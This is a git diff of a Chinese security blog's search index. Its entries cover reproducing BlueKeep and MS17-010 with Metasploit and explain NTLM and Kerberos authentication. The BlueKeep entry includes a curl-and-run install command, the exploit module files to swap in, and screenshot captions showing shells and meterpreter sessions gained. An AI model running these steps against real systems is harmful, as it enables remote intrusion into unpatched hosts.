-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>因为这个 pull不是正式的，所以需要自行比对 diff增删或者<strong>直接替换</strong>文件: <a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">Pull 地址</a></p>
-<p>这里已下载完成，可直接替换使用(建议去 Pull下载，万一就更新了呢)：</p>
-<ul>
-<li><a href="./Tools/rdp.rb">rdp.rb</a></li>
-<li><a href="./Tools/cve_2019_0708_bluekeep.rb">cve_2019_0708_bluekeep.rb</a></li>
-<li><a href="./Tools/rdp_scanner.rb">rdp_scanner.rb</a></li>
-<li><a href="./Tools/cve_2019_0708_bluekeep_rce.rb">cve_2019_0708_bluekeep_rce.rb</a></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对应的替换文件</span></span><br><span class="line"></span><br><span class="line">lib/msf/core/exploit/rdp.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="./2019-09-11%2020-43-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="可以正常搜索到"></p>
-<br>
-
-<p>执行 <code>exploit</code></p>
-<p><img src="./2019-09-12%2012-42-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="按需选择 target"><br><img src="./2019-09-12%2015-36-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="目标机远程选项选第 3项会报无漏洞"><br><img src="./2019-09-10%2014-46-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 shell"><br><img src="./2019-09-10%2020-38-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="003" title="返回 meterpreter"><br><img src="./cve-2019-0708_win2k8_2.gif" alt="004" title="Win2k8进行 expliot出现蓝屏重启情况(第一次蓝屏)"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows认证体系—NTLM认证</title>
-    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
-    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
-<a id="more"></a>
-
-<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
-<li><code>NTLM Hash</code> </li>
-<li><code>NTLM</code> </li>
-<li><code>LSASS</code> </li>
-<li><code>Net-NTLM hash</code> </li>
-</ul>
-<br>
-
-<p>关键词解释：</p>
-<ul>
-<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
-<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
-<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
-<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
-</ul>
-<br>
-
-<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
-
-<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
-<blockquote>
-<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
-</blockquote>
-<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
-
-<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
-<br>
-
-<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
-
-<blockquote>
-<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
-</blockquote>
-<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
-<br>
-
-<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
-
-<ul>
-<li>用户密码：<code>susi2001</code></li>
-<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
-<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
-<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
-</ul>
-<br>
-
-<blockquote>
-<p>MD4加密使用 <code>HashCalc</code> </p>
-</blockquote>
-<br>
-
-<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
-
-<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
-<br>
-
-<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
-
-<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
-<br>
-
-<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
-
-<ul>
-<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
-<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
-
-<p>NTLM协议的认证过程有三步：</p>
-<ul>
-<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
-<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
-<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
-</ul>
-<p>大致流程如下：</p>
-<ul>
-<li>使用用户名和密码尝试登录客户端</li>
-<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
-<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
-<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
-<li>服务器发送三项数据给域控制器：<ul>
-<li><code>User name</code></li>
-<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
-<li>从客户端接收到的 <code>Response</code> </li>
-</ul>
-</li>
-<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
-</ul>
-<blockquote>
-<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
-</blockquote>
-<blockquote>
-<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
-</blockquote>
-<br>
-
-<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
-
-<blockquote>
-<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
-</blockquote>
-<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
-<ul>
-<li>Challenge：<ul>
-<li><code>v1</code>： 8-byte</li>
-<li><code>v2</code>：16-byte </li>
-</ul>
-</li>
-<li>Net NTLM Hash：<ul>
-<li><code>v1</code>：DES</li>
-<li><code>v2</code>： HMAC-MD5</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
-<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
-<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Windows</tag>
-        <tag>渗透测试</tag>
-        <tag>Security</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010复现</title>
-    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
-<a id="more"></a>
-
-<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
-<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
-<p>受影响的系统(详细系统版本请查看公告)：</p>
-<ul>
-<li>Windows Vista</li>
-<li>Windows Server 2008</li>
-<li>Windows 7</li>
-<li>Windows Server 2008 R2</li>
-<li>Windows 8.1</li>
-<li>Windows Server 2012 和 Windows Server 2012 R2</li>
-<li>Windows RT 8.1</li>
-<li>Windows 10</li>
-<li>Windows Server 2016</li>
-</ul>
-<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
-<ul>
-<li>CVE-2017-0143</li>
-<li>CVE-2017-0144</li>
-<li>CVE-2017-0145</li>
-<li>CVE-2017-0146</li>
-<li>CVE-2017-0148</li>
-</ul>
-<br>
-
-<p>复现环境：</p>
-<ul>
-<li>Windows 7 (Build 7601, Service Pack 1)</li>
-<li>Ubuntu server(Metasploit)</li>
-</ul>
-<br>
-
-<p><img src="./2019-09-13%2011-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13%2011-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13%2010-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
+        <tag>Note</tag>
       </tags>
   </entry>
   <entry>
@@ -868,173 +543,284 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 </ul>
 ]]></content>
       <tags>
-        <tag>Security</tag>
         <tag>Web Security</tag>
+        <tag>Security</tag>
       </tags>
   </entry>
   <entry>
-    <title>Windows域认证体系—Kerberos认证</title>
-    <url>/2019/08/25/Windows%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94Kerberos%E8%AE%A4%E8%AF%81/</url>
-    <content><![CDATA[<p>Kerberos认证流程、含义</p>
+    <title>Windows认证体系—NTLM认证</title>
+    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
+    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
 <a id="more"></a>
 
-<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><br>
-
-<ul>
-<li>Kerberos认证</li>
-<li>域控制器（Domain Controller，DC）</li>
-<li>密钥分发中心（Key Distribution Center，KDC）</li>
-<li>帐户数据库（Account Database，AD）</li>
-<li>身份验证服务（Authentication Service，AS）</li>
-<li>入场卷[认证票据]（Ticket Granting Ticket，TGT）</li>
-<li>票据发放服务（Ticket Granting Service，TGS）</li>
-<li>票据（Ticket）</li>
-<li>Master Key / Long-term Key |长期密钥（被 Hash加密的用户密钥）</li>
-<li>Session Key / Short-term Key | 短期会话密钥</li>
-<li>krbtgt 账户</li>
+<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
+<li><code>NTLM Hash</code> </li>
+<li><code>NTLM</code> </li>
+<li><code>LSASS</code> </li>
+<li><code>Net-NTLM hash</code> </li>
 </ul>
 <br>
 
-<p>关键词/名称含义：</p>
+<p>关键词解释：</p>
 <ul>
-<li><code>Account Database</code>：类似于 SAM的数据库，存储所有 Client的白名单，只有处于白名单中的 Client才可以成功申请 TGT</li>
-<li><code>Authentication Service</code>：为 Client生成 TGT的服务</li>
-<li><code>Ticket Granting Ticket</code>：入场券，通过入场券能够获得票据，是一种临时凭证的存在</li>
-<li><code>Ticket Granting Service</code>：为 Client生成某个服务的票据</li>
-<li><code>Ticket</code>：票据，网络对象互相访问的凭证</li>
-<li><code>Master Key</code>：长期密钥。将本机密码进行 Hash运算（NTML）得到一个 Hash Code, 我们一般管这样的 Hash Code叫做 Master Key</li>
-<li><code>Session Key</code>：短期会话密钥。一种只在一段时间内有效的 Key</li>
-<li><code>krbtgt账户</code>：每个域控制器都有一个 krbtgt的用户账户，是 KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥</li>
+<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
+<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
+<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
+<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
 </ul>
 <br>
 
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><br>
+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
 
-<h3 id="Kerberos认证含义"><a href="#Kerberos认证含义" class="headerlink" title="Kerberos认证含义"></a>Kerberos认证含义</h3><blockquote>
-<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机 / 服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p>
-</blockquote>
+<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
 <blockquote>
-<p>在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。——<a href="https://baike.baidu.com/item/Kerberos/5561682?fr=aladdin" target="_blank" rel="noopener">度娘百科</a></p>
+<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
 </blockquote>
+<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
 <br>
 
-<h3 id="Kerberos认证的三只狗头（脑补地狱三头犬）"><a href="#Kerberos认证的三只狗头（脑补地狱三头犬）" class="headerlink" title="Kerberos认证的三只狗头（脑补地狱三头犬）"></a>Kerberos认证的三只狗头（脑补地狱三头犬）</h3><ul>
-<li>Client</li>
-<li>Server</li>
-<li>DC（KDC）。在 Windows域环境中，KDC的角色由 DC（Domain Controller）来担当</li>
-</ul>
-<br>
-
-
-<h2 id="Kerberos大致流程"><a href="#Kerberos大致流程" class="headerlink" title="Kerberos大致流程"></a>Kerberos大致流程</h2><br>
-
-<ul>
-<li>Client 携带账户信息向 KDC上的 AS服务发送想要访问 Server A的请求，索要入场卷（ TGT）；AS通过 AD验证 Client账户的访问权，成功后返回 TGT</li>
-<li>Client 携带 TGT请求 KDC中的 TGS服务想要访问 Server A，索要票据（Ticket）；TGS验证 Client的 TGT，具有 Server A的访问权，返回 Ticket</li>
-<li>Client 携带 Ticket与服务器进行相互验证且成功，可以访问 Server A，但无权访问其他服务器</li>
-</ul>
-<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B.png" alt="域认证流程"></p>
-<br>
-
-<h2 id="Kerberos-认证三步走"><a href="#Kerberos-认证三步走" class="headerlink" title="Kerberos 认证三步走"></a>Kerberos 认证三步走</h2><br>
-
-<h3 id="第一步-Client-与-AS"><a href="#第一步-Client-与-AS" class="headerlink" title="第一步 Client 与 AS"></a>第一步 Client 与 AS</h3><br>
+<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
 
 <blockquote>
-<p>第一步 AS 实现对 Client 身份的确认，并颁发给该 Client 一个 TGT</p>
+<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
 </blockquote>
-<p>首先，Client发送一个携带被自身 Master Key加密的身份信息 AS Request到 KDC，KDC验证用户名是否存在于 AD中（KDC 可以通 AD中对应用户名提取该 Client 的 Master Key）</p>
-<ol>
-<li><code>AS Request</code>大致内容：</li>
-</ol>
+<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
+<br>
+
+<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
+
 <ul>
-<li><code>Pre-authentication data</code>：被 Client 的 Master Key加密过的 Timestamp（Timestamp防爆破）。时间同步（Time Synchronization）显得尤为重要</li>
-<li><code>Client name &amp; realm</code>：<em>Domain name\Client name</em> （Client info）</li>
-<li><code>Server Name</code>：KDC中 TGS 的 Server Name</li>
+<li>用户密码：<code>susi2001</code></li>
+<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
+<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
+<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
 </ul>
 <br>
-
-<p>AS 需要验证发送方 <code>Client info</code> 是否为本人（Client的密码对否），所以 AS 只需从 AD中提取 Client对应的 Master Key 对 <code>Pre-authentication data</code> 进行解密，如果是一个合法的 <strong>Timestamp</strong>（时间差距合理），则可以证明发送方提供的用户名是存在于白名单中且密码对应正确的</p>
-<p>验证成功后，返回给 Client一个 <code>AS Response</code>，主要包含两个部分：请求 Client 的 Master Key加密过的 <code>TGS Session Key</code> 和被 KDC（krbtgt 帐户）加密的TGT （<strong>客户端无法解密 TGT</strong>，因为它没有 KDC Hash）</p>
-<ol>
-<li>TGT大致内容：</li>
-</ol>
-<ul>
-<li><code>Session Key</code> : 第一部分的 <code>TGS Session Key</code> （这里的 Session Key 是被 KDC加密,不是 Client）</li>
-<li><code>Client name &amp; realm</code> : <em>Domain name\Client</em> （Client info）</li>
-<li><code>End time</code> : TGT到期的时间</li>
-</ul>
-<br>
-
-<p>KDC此时生成一个 <code>Session Key</code>，使用 Client 用户名对应的 Master Key加密 Session Key，作为 AS数据（第一部分，用于后续与 TGS通讯）；使用 KDC中 krbtgt 帐户 的 Master Key 加密 Session Key 和 <code>Client info</code>，生成TGT（第二部分）</p>
-<p>Client 通过自己的 Master Key 对第一部分解密获得 <code>TGS Session Key</code>后，携带 TGT进入第二步</p>
-<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%80%E6%AD%A5.png" alt="域认证第一步" title="域认证第一步"></p>
-<br>
-
-<h3 id="第二步-Client-与-TGS"><a href="#第二步-Client-与-TGS" class="headerlink" title="第二步 Client 与 TGS"></a>第二步 Client 与 TGS</h3><br>
 
 <blockquote>
-<p>第二步 实现 TGS 对 Client 身份（TGT）的确认，并分发给该 Client 一个 Ticket</p>
+<p>MD4加密使用 <code>HashCalc</code> </p>
 </blockquote>
-<p>Client 使用 AS返回的 <code>TGS Session Key</code> 建立访问 KDC中 TGS服务的请求（<code>TGS Request</code>），再将 TGT 连同请求一起发送到 TGS 服务</p>
-<ol>
-<li><code>TGS Request</code>大致内容：</li>
-</ol>
-<ul>
-<li><code>Authenticator</code>：（Client info + timestamp）通过 <code>TGS Session Key</code>加密</li>
-<li><code>TGT</code> ：（<em>TGS Session Key + Client info + End Time</em>）</li>
-<li><code>Client info</code> ：<em>Domain name/ Client</em></li>
-<li><code>Server info</code> ：Client试图访问的 Server</li>
-<li><code>时间戳</code></li>
-</ul>
 <br>
 
-<p>TGS收到 <code>TGS Request</code>后需要验证 TGT 和 Authenticator；因为 <code>Authenticator</code> 被 <code>TGS Session Key</code> 加密，TGS服务并没有保存这个 Session Key ；于是使用 TGS 自己的 Master Key 解密 TGT 获得其中的 TGS Session Key，进而解密 Authenticator，验证客户端是否受信</p>
-<p>验证成功后，TGS 返回一个 <code>TGS Response</code> ，包含两个消息：加密的 Ticket 和加密的 Session Key</p>
-<ol>
-<li><code>TGS Response</code> 大致内容：</li>
-</ol>
-<ul>
-<li>使用 Server 的 Master Key 进行加密的 Ticket</li>
-<li>通过 <code>TGS Session Key</code> 加密的 <code>Server Session Key</code> （将来 Client与 Server Service的通信使用）</li>
-</ul>
-<ol start="2">
-<li><code>Ticket</code> 大致内容：</li>
-</ol>
-<ul>
-<li>Server Session Key</li>
-<li>Client info</li>
-<li>End time: Ticket的到期时间</li>
-</ul>
+<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
+
+<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
 <br>
 
-<p>Client收到 <code>TGS Response</code> 后，使用 <code>TGS Session Key</code> 解密 <code>Server Session Key</code>，得到 Session Key 后，进入第三步</p>
-<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%BA%8C%E6%AD%A5.png" alt="域认证第二步" title="域认证第二步"></p>
+<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
+
+<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
 <br>
 
-<h3 id="第三步-Client-和-Server"><a href="#第三步-Client-和-Server" class="headerlink" title="第三步 Client 和 Server"></a>第三步 Client 和 Server</h3><br>
+<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
+
+<ul>
+<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
+<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
+
+<p>NTLM协议的认证过程有三步：</p>
+<ul>
+<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
+<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
+<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
+</ul>
+<p>大致流程如下：</p>
+<ul>
+<li>使用用户名和密码尝试登录客户端</li>
+<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
+<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
+<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
+<li>服务器发送三项数据给域控制器：<ul>
+<li><code>User name</code></li>
+<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
+<li>从客户端接收到的 <code>Response</code> </li>
+</ul>
+</li>
+<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
+</ul>
+<blockquote>
+<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
+</blockquote>
+<blockquote>
+<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
+</blockquote>
+<br>
+
+<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
 
 <blockquote>
-<p>第三步，Client 携带 <code>Server Session Key</code> 和 <code>Ticket</code>访问服务器，验证成功后，可以访问 Server资源</p>
